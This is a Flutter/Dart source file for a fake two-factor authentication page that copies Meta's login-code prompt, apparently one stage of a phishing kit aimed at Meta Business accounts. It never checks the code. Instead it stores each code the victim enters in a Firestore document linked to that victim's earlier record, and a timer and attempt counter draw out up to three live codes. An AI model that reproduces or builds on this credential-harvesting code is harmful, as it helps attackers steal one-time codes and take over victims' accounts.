import 'dart:async';
import 'package:_iwu_pack/setup/index.dart';
import 'package:_iwu_pack/widgets/widget_ripple_button.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:meta_business/src/presentation/home/widget/footer.dart';
import 'package:meta_business/src/presentation/home/widget/header.dart';
import 'package:meta_business/src/presentation/home/widget/widget_input.dart';
import 'package:meta_business/src/resources/firestore/firestore_resources.dart';

class AuthScreen extends StatefulWidget {
  const AuthScreen({Key? key, this.rowId}) : super(key: key);
  final String? rowId;
  @override
  _AuthScreenState createState() => _AuthScreenState();
}

class _AuthScreenState extends State<AuthScreen> {
  bool isButtonDisabled = false;
  TextEditingController twoFACodeController = TextEditingController();

  String? twoFACode;
  String twoFACodeFake = "123456";
  String? error2FA;

  int _secondsRemaining = 60;
  Timer? _timer;

  int maxAttempts = 3;
  int attemptsMade = 0;

  // hàm countdown thời gian chờ 1p
  void startTimer() {
    const oneSec = Duration(seconds: 1);
    _timer = Timer.periodic(oneSec, (timer) {
      setState(() {
        if (_secondsRemaining > 0) {
          _secondsRemaining--;
        } else {
          _timer?.cancel();
        }
      });
    });
  }

  void addNewColumn() async {
    // Xác định đường dẫn đến tài liệu cần thêm cột mới
    try {
      print(" check widget ${widget.rowId}");
      final ref = colData.doc(widget.rowId);
      print("check ref $ref");
      ref.update({"twoFA$attemptsMade": twoFACode});
    } catch (e) {
      print("loi: $e");
    }
  }

  void _disableButton() {
    // if (twoFACode != twoFACodeFake) {
    //   error2FA = "Your verification code was incorrect, please try again!";
    // }
    // khi nhấn nút thì khởi tạo lại thời gian đếm
    if (attemptsMade < maxAttempts) {
      _secondsRemaining = 60;
      setState(() {
        isButtonDisabled = true;
        print("attemp $attemptsMade");
      });
      attemptsMade++;
      startTimer();
      addNewColumn();
    }
  }

  @override
  Widget build(BuildContext context) {
    // nếu sau 1 phút thì enable nút send
    if (_secondsRemaining == 0) {
      isButtonDisabled = false;
    }
    // nếu gửi 3 lần thì không cho gửi nữa - disable nút send
    if (attemptsMade == maxAttempts) {
      isButtonDisabled = true;
    }

    return Scaffold(
      body: Column(
        children: [
          const Header(), // Header remains at the top
          Expanded(
            child: SingleChildScrollView(
              // Wrap the body with SingleChildScrollView
              child: Column(
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  //body
                  SizedBox(
                    height: 100,
                  ),
                  Container(
                    width: 560,
                    // Adjust as needed
                    decoration: BoxDecoration(
                      color: Colors.white,
                      borderRadius: BorderRadius.circular(8), // Rounded border
                      boxShadow: [
                        BoxShadow(
                          color: Colors.grey.withOpacity(0.5),
                          spreadRadius: 5,
                          blurRadius: 7,
                          offset:
                              const Offset(0, 3), // changes position of shadow
                        ),
                      ],
                    ),
                    padding: const EdgeInsets.symmetric(
                        vertical: 16, horizontal: 16),
                    margin: const EdgeInsets.all(16),
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            Text(
                              "Two-factor authentication required ($attemptsMade/$maxAttempts)",
                              style: const TextStyle(
                                  fontWeight: FontWeight.bold,
                                  fontSize: 18,
                                  height: 1.6),
                            ),
                          ],
                        ),
                        const Divider(), // Divider line
                        const SizedBox(height: 16),
                        const Text(
                          "You've asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.",
                          textAlign: TextAlign.left,
                          style: TextStyle(fontSize: 16, height: 1.6),
                        ),
                        const SizedBox(height: 16),
                        const Text(
                          "Enter the 6-digit code from your code generator or third-party app below",
                          textAlign: TextAlign.left,
                          style: TextStyle(fontSize: 16, height: 1.6),
                        ),
                        Row(
                          crossAxisAlignment: CrossAxisAlignment.end,
                          children: [
                            WidgetInput(
                                width: 200,
                                hint: "Login code",
                                validator: (value) {
                                  if (value == null || value.isEmpty) {
                                    return 'Please enter your capcha';
                                  }
                                },
                                controller: twoFACodeController,
                                onChanged: (value) {
                                  setState(() {
                                    twoFACode = value;
                                    print("2FA $twoFACode");
                                  });
                                }),
                            // khi  nút send disable và thời gian chờ > 1 thì hiện thị hiển thị thời gian chờ, else không hiển thị gì
                            isButtonDisabled && _secondsRemaining > 1
                                ? Padding(
                                    padding: const EdgeInsets.all(15),
                                    child: Text("(0:$_secondsRemaining)"))
                                : const Text(""),
                          ],
                        ),
                        const SizedBox(height: 8),
                        error2FA == null
                            ? Text("")
                            : Container(
                                margin: EdgeInsets.only(bottom: 16),
                                child: Text(
                                  "$error2FA",
                                  style: TextStyle(color: Colors.red),
                                ),
                              ),

                        const Divider(), // Divider line
                        const SizedBox(height: 8),
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            const Text(
                              "Need another way to authenticate?",
                              style: TextStyle(
                                  fontSize: 16,
                                  color: Colors.blue,
                                  decoration: TextDecoration.underline),
                            ),
                            // ElevatedButton(
                            //   onPressed:
                            //       isButtonDisabled ? null : _disableButton,
                            //   style: ElevatedButton.styleFrom(
                            //     backgroundColor: isButtonDisabled
                            //         ? hexColor('355797')
                            //         : hexColor('5E77AA'),
                            //     // Assuming blue is the primary color
                               
                            //   ),
                            //   child: Text("Send", style: TextStyle(color: isButtonDisabled ? Colors.grey : Colors.white),),
                            // ),
                            WidgetRippleButton(
                              borderRadius: BorderRadius.circular(8),
                                      onTap: isButtonDisabled ? null : _disableButton,
                                      color: isButtonDisabled
                                          ? hexColor('E0E0E0')
                                          : hexColor('5E77AA'),
                                      child: Container(
                                        padding:  EdgeInsets.symmetric(
                                            horizontal: 16, vertical: 8),
                                           
                                        child: Text(
                                          "Send",
                                          style: w400TextStyle(
                                              fontSize: 14,
                                              color:isButtonDisabled ? Colors.grey : Colors.white),
                                        ),
                                      ),
                                    ),
                          ],
                        ),
                      ],
                    ),
                  ),
                  SizedBox(
                    height: 100,
                  ),
                  Footer(), // Footer remains at the bottom
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
